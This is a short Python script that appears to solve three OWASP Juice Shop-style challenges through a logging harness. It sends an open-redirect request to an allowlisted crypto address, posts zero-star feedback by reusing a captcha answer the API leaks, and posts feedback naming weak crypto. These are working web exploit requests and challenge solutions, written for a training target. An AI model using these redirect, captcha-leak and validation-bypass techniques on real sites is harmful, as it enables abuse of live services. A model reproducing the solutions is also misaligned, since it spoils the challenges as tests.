"""Fix redirect + feedback (captcha) challenges."""
import harness, urllib.parse
from harness import Session, log_attempt, solved_set
s = Session()
def solved(k): return k in solved_set(s)

def L(key,name,approach,ok,detail=""):
    return log_attempt(key,name,approach,("success" if ok else "failed"),ok,detail)

# Outdated Allowlist - correct deprecated address
addr = "https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm"
r = s.get("/redirect?to=" + urllib.parse.quote(addr, safe=""), auth=False)
L("redirectCryptoCurrencyChallenge","Outdated Allowlist",
  f"GET /redirect?to={addr} (deprecated crypto address still allowlisted)",
  solved("redirectCryptoCurrencyChallenge"), f"{r.status_code}")

def captcha():
    c = s.get("/rest/captcha/", auth=False).json()
    return c["captchaId"], c["answer"]

# Zero Stars feedback (rating 0) with valid captcha
cid, ans = captcha()
r = s.post("/api/Feedbacks", auth=False, json={"comment":"Zero!","rating":0,"captchaId":cid,"captcha":ans})
L("zeroStarsChallenge","Zero Stars",
  "POST /api/Feedbacks rating:0 with leaked captcha answer (frontend min-1 bypass)",
  solved("zeroStarsChallenge"), f"{r.status_code} {r.text[:80]}")

# Weird Crypto - feedback mentioning md5 / z85
cid, ans = captcha()
r = s.post("/api/Feedbacks", auth=False, json={"comment":"Please stop using md5 and z85, they are insecure!","rating":1,"captchaId":cid,"captcha":ans})
# trigger databaseRelatedChallenges verify job via a GET
s.get("/api/Challenges/", auth=False)
L("weirdCryptoChallenge","Weird Crypto",
  "POST feedback naming insecure crypto (md5/z85); detected by verify job",
  solved("weirdCryptoChallenge"), f"{r.status_code}")
